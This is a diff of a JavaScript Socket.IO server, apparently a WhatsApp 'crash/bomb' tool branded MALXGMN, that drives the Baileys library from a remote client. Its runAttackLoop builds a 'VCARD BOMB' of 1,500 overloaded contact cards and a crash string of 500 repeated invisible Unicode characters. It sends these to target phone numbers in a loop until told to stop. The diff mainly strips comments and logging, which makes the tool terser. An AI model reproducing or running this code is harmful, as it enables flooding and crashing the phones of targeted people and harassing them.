@@ -1,7 +1,6 @@
 // stateless_server.js
-// DENO DEPLOY + SOCKET.IO (GHOST MODE)
-// NO DATABASE. NO DISK. ALL IN MEMORY (RAM).
-// Session data is provided by the CLIENT (Flutter) upon connection.
+// VERSION: GHOST-V2-UNICODE-FIX
+// TIMESTAMP: ${new Date().toISOString()}
 
 import { Server } from "npm:socket.io";
 import { createServer } from "node:http";
@@ -25,18 +24,13 @@ const httpServer = createServer((req, res) => {
 
 const io = new Server(httpServer, {
     cors: {
-        origin: "*", // Allow connection from Flutter anywhere
+        origin: "*", 
         methods: ["GET", "POST"]
     }
 });
 
-// GLOBAL STATE (Only valid for active connection)
 let activeSock = null;
 let isAttacking = false;
-
-// --- CUSTOM IN-MEMORY AUTH STATE ---
-// This function creates an AuthState that starts with data from CLIENT
-// and emits updates back to CLIENT to save locally.
 
 const useSocketAuthState = async (socket, initialData) => {
     const creds = initialData?.creds 
@@ -46,13 +40,7 @@ const useSocketAuthState = async (socket, initialData) => {
     const keys = initialData?.keys || {};
 
     const saveState = async () => {
-        // Prepare data to send back to client
-        const exportData = {
-            creds: creds,
-            keys: keys
-        };
-        // Emit 'session_save' event to client with full data
-        // Client MUST save this JSON to local storage
+        const exportData = { creds, keys };
         socket.emit('session_save', JSON.stringify(exportData, BufferJSON.replacer));
     };
 
@@ -83,28 +71,19 @@ const useSocketAuthState = async (socket, initialData) => {
                             }
                         }
                     }
-                    saveState(); // Trigger save to client
+                    saveState(); 
                 }
             }
         },
-        saveCreds: async () => {
-            await saveState(); // Trigger save to client
-        }
+        saveCreds: async () => await saveState()
     };
 };
-
-
-// --- SOCKET.IO LOGIC ---
 
 io.on("connection", (socket) => {
     console.log(`[+] New Client Connected: ${socket.id}`);
 
-    // CLIENT: Emit 'init_session' with stored JSON (or null)
     socket.on("init_session", async (rawSessionJson) => {
         try {
-            console.log("[*] Client requested session init...");
-            
-            // If previous socket exists, close it to avoid conflict
             if (activeSock) {
                 try { activeSock.end(undefined); } catch {}
                 activeSock = null;
@@ -114,47 +93,28 @@ io.on("connection", (socket) => {
             if (rawSessionJson) {
                 try {
                     initialData = JSON.parse(rawSessionJson, BufferJSON.reviver);
-                    console.log("[✔] Session data loaded from client payload");
+                    console.log("[✔] Session loaded");
                 } catch (e) {
-                    console.log("[-] Invalid JSON provided, starting fresh session");
+                    console.log("[-] Invalid JSON");
                 }
-            } else {
-                console.log("[!] No session provided, starting fresh QR scan");
-            }
-
-            // Start Baileys with this In-Memory State
+            } 
             await startSock(socket, initialData);
 
         } catch (e) {
             console.error("Init Error:", e);
-            socket.emit("error", e.message);
         }
     });
 
-    // CLIENT: Emit 'attack_start' with targets
     socket.on("attack_start", async (targets) => {
         if (!activeSock) return socket.emit("error", "WA Not Connected");
-        if (isAttacking) return socket.emit("error", "Already Attacking");
-        
-        console.log(`[!] ATTACK ORDER RECEIVED: ${targets}`);
         runAttackLoop(socket, targets);
     });
 
-    // CLIENT: Emit 'attack_stop'
     socket.on("attack_stop", () => {
         isAttacking = false;
         socket.emit("status", "Attack Stopped");
     });
-
-    socket.on("disconnect", () => {
-        console.log(`[-] Client Disconnected: ${socket.id}`);
-        // Optional: Kill bot if client leaves to save resources?
-        // For now, keep it running briefly.
-    });
 });
-
-
-// --- BAILEYS LOGIC ---
 
 async function startSock(socket, initialData) {
     const { state, saveCreds } = await useSocketAuthState(socket, initialData);
@@ -163,39 +123,31 @@ async function startSock(socket, initialData) {
     const sock = makeWASocket({
         version,
         logger: pino({ level: 'silent' }),
-        printQRInTerminal: false, // Don't print to console, emit to socket
+        printQRInTerminal: false,
         auth: {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
-        browser: ["MALXGMN (Ghost)", "Chrome", "1.0.0"],
+        browser: ["MALXGMN", "Chrome", "1.0.0"],
         generateHighQualityLinkPreview: true,
     });
 
     sock.ev.on('connection.update', (update) => {
         const { connection, lastDisconnect, qr } = update;
 
-        if (qr) {
-            // Emit QR to Client to display in Flutter
-            socket.emit('qr', qr); 
-            console.log("[QR] QR Code sent to client");
-        }
+        if (qr) socket.emit('qr', qr);
 
         if (connection === 'close') {
             const shouldReconnect = (lastDisconnect.error instanceof Boom)
                 ? lastDisconnect.error.output?.statusCode !== DisconnectReason.loggedOut
                 : true;
             
-            console.log('[!] Connection closed. Reconnecting:', shouldReconnect);
-            
             if (shouldReconnect) {
-                startSock(socket, initialData); // Try again
+                startSock(socket, initialData);
             } else {
                 socket.emit('logged_out', 'Session Invalidated');
-                console.log('[!] Logged out.');
             }
         } else if (connection === 'open') {
-            console.log('[+] WHATSAPP CONNECTED!');
             activeSock = sock;
             socket.emit('ready', 'WhatsApp Connected');
         }
@@ -204,25 +156,27 @@ async function startSock(socket, initialData) {
     sock.ev.on('creds.update', saveCreds);
 }
 
-// --- ATTACK LOGIC ---
-
 async function runAttackLoop(socket, rawTargets) {
     isAttacking = true;
     const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
     
-    // Payloads (UNICODE SAFE FOR DENO DEPLOY)
-    const fireEmoji = "\\uD83D\\uDD25";
-    const skullEmoji = "\\u2620\\uFE0F";
-    const bombEmoji = "\\uD83D\\uDCA3";
-    const invisibleChar = "\\u200e\\u200f";
+    // --- PAYLOADS (STRICTLY NO EMOJI LITERALS) ---
+    const _f = "\\uD83D\\uDD25"; // FIRE
+    const _s = "\\u2620\\uFE0F"; // SKULL
+    const _b = "\\uD83D\\uDCA3"; // BOMB
+    const _i = "\\u200e\\u200f"; // INVISIBLE
 
+    // VCARD BOMB
     let heavyVcardContent = '';
+    const vcardHeader = 'BEGIN:VCARD\nVERSION:3.0\nFN:';
+    const vcardFooter = '\nTEL;type=CELL;waid=0:0\nEND:VCARD\n';
+    
     for(let i=0; i<1500; i++) {
-        heavyVcardContent += 'BEGIN:VCARD\nVERSION:3.0\nFN:' + fireEmoji.repeat(10) + 'OVERLOAD_' + i + '\nTEL;type=CELL;waid=0:0\nEND:VCARD\n';
+        heavyVcardContent += vcardHeader + _f.repeat(10) + 'OVERLOAD_' + i + vcardFooter;
     }
     
-    const vcardPayload = { contacts: { displayName: skullEmoji, contacts: [{ vcard: heavyVcardContent }] } };
-    const crashText = bombEmoji + invisibleChar.repeat(500);
+    const vcardPayload = { contacts: { displayName: _s, contacts: [{ vcard: heavyVcardContent }] } };
+    const crashText = _b + _i.repeat(500);
 
     let counter = 0;
     while(isAttacking) {
@@ -237,16 +191,14 @@ async function runAttackLoop(socket, rawTargets) {
             }
             await Promise.all(batchTasks);
             
-            socket.emit('attack_progress', { count: counter, targets: targetJids.length });
-            await delay(200); 
+            socket.emit('attack_progress', { count: counter });
+            await delay(500); // Slow down to prevent CPU Kill
         } catch (e) {
-            console.log(`[!] Attack Error: ${e.message}`);
             await delay(1000);
         }
     }
 }
 
-// START SERVER
 const PORT = 8000;
 httpServer.listen(PORT, () => {
     console.log(`[SERVER] GHOST Listening on port ${PORT}`);
